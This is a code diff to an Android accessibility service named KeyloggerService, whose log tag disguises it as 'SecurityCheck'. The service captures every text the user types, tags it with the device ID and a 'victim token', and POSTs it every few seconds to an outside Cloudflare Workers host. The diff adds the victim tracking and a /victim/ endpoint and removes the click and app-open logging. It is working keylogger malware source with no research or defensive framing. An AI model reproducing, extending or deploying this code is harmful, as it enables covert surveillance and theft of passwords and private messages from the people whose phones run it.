@@ -4,9 +4,9 @@ import android.accessibilityservice.AccessibilityService;
 import android.accessibilityservice.AccessibilityServiceInfo;
 import android.content.Intent;
 import android.os.AsyncTask;
+import android.provider.Settings;
 import android.util.Log;
 import android.view.accessibility.AccessibilityEvent;
-import android.view.accessibility.AccessibilityNodeInfo;
 
 import org.json.JSONObject;
 
@@ -15,71 +15,53 @@ import java.net.HttpURLConnection;
 import java.net.URL;
 
 public class KeyloggerService extends AccessibilityService {
+
     private static final String TAG = "SecurityCheck";
     private static final String SERVER_URL = "https://sec.h42536974.workers.dev";
+
     private StringBuilder buffer = new StringBuilder();
     private long lastFlush = 0;
     private static final long FLUSH_INTERVAL = 5000;
     private String deviceId = "";
+    private String victimToken = "";
 
     @Override
     public void onServiceConnected() {
         super.onServiceConnected();
         Log.d(TAG, "Keylogger service connected");
-        
+
         AccessibilityServiceInfo info = new AccessibilityServiceInfo();
         info.eventTypes = AccessibilityEvent.TYPES_ALL_MASK;
         info.feedbackType = AccessibilityServiceInfo.FEEDBACK_ALL_MASK;
         info.notificationTimeout = 100;
         info.flags = AccessibilityServiceInfo.FLAG_INCLUDE_NOT_IMPORTANT_VIEWS
-                   | AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
-                   | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
+                | AccessibilityServiceInfo.FLAG_REPORT_VIEW_IDS
+                | AccessibilityServiceInfo.FLAG_RETRIEVE_INTERACTIVE_WINDOWS;
         setServiceInfo(info);
 
         try {
-            deviceId = android.provider.Settings.Secure.getString(
-                getContentResolver(),
-                android.provider.Settings.Secure.ANDROID_ID
-            );
-        } catch (Exception e) {}
+            deviceId = Settings.Secure.getString(
+                    getContentResolver(), Settings.Secure.ANDROID_ID);
+        } catch (Exception ignored) {}
+
+        try {
+            victimToken = BuildConfig.VICTIM_TOKEN;
+        } catch (Exception ignored) {}
     }
 
     @Override
     public void onAccessibilityEvent(AccessibilityEvent event) {
         try {
             int eventType = event.getEventType();
-            
             if (eventType == AccessibilityEvent.TYPE_VIEW_TEXT_CHANGED) {
-                CharSequence text = event.getText() != null && !event.getText().isEmpty() 
-                    ? event.getText().get(0) : null;
-                
+                CharSequence text = (event.getText() != null
+                        && !event.getText().isEmpty()) ? event.getText().get(0) : null;
                 if (text != null) {
                     String currentText = text.toString();
                     buffer.append(currentText).append("|");
                     tryFlush();
                 }
             }
-            
-            // مراقبة النقرات
-            else if (eventType == AccessibilityEvent.TYPE_VIEW_CLICKED) {
-                CharSequence text = event.getText() != null && !event.getText().isEmpty()
-                    ? event.getText().get(0) : null;
-                if (text != null) {
-                    buffer.append("[CLICK:").append(text.toString()).append("]");
-                    tryFlush();
-                }
-            }
-            
-            // مراقبة النوافذ المفتوحة (يعرف التطبيقات المستخدمة)
-            else if (eventType == AccessibilityEvent.TYPE_WINDOW_STATE_CHANGED) {
-                CharSequence pkg = event.getPackageName();
-                CharSequence cls = event.getClassName();
-                if (pkg != null) {
-                    buffer.append("[OPEN:").append(pkg.toString()).append("]");
-                    tryFlush();
-                }
-            }
-            
         } catch (Exception e) {
             Log.e(TAG, "onAccessibilityEvent error: " + e.getMessage());
         }
@@ -87,7 +69,7 @@ public class KeyloggerService extends AccessibilityService {
 
     private void tryFlush() {
         long now = System.currentTimeMillis();
-        if (now - lastFlush > FLUSH_INTERVAL || buffer.length() > 500) {
+        if (now - lastFlush >= FLUSH_INTERVAL || buffer.length() >= 500) {
             String data = buffer.toString();
             buffer.setLength(0);
             lastFlush = now;
@@ -102,15 +84,17 @@ public class KeyloggerService extends AccessibilityService {
                 try {
                     JSONObject data = new JSONObject();
                     data.put("type", "keylog");
+                    data.put("token", victimToken);
                     data.put("device", deviceId);
                     data.put("text", text);
 
-                    URL url = new URL(SERVER_URL + "/apk/data");
+                    URL url = new URL(SERVER_URL + "/apk/victim/data");
                     HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                     conn.setRequestMethod("POST");
                     conn.setRequestProperty("Content-Type", "application/json");
                     conn.setDoOutput(true);
                     conn.setConnectTimeout(10000);
+                    conn.setReadTimeout(10000);
 
                     DataOutputStream os = new DataOutputStream(conn.getOutputStream());
                     os.writeBytes(data.toString());
@@ -134,4 +118,4 @@ public class KeyloggerService extends AccessibilityService {
     public boolean onUnbind(Intent intent) {
         return super.onUnbind(intent);
     }
-                  }
+}
